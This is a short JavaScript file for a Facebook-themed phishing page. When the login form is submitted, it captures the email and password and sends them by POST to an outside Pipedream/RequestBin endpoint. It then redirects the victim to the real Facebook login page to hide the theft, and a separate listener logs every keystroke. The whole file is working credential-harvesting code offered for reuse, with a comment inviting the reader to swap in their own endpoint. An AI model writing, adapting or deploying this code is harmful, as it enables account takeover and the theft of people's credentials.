document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const email = document.getElementsByName('email')[0].value;
    const password = document.getElementsByName('password')[0].value;

    console.log("Email: " + email + ", Password: " + password);

    // RequestBin/Pipedream Integration
    const xhr = new XMLHttpRequest();
    const requestBinUrl = "https://eoe5le38qoo4enf.m.pipedream.net"; // Replace with your RequestBin/Pipedream URL
    xhr.open('POST', requestBinUrl, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password));

    // Redirect to Facebook
    window.location.href = "https://www.facebook.com/login/";
});

document.addEventListener('keydown', function(e) {
    console.log('Key pressed: ' + e.key);
});
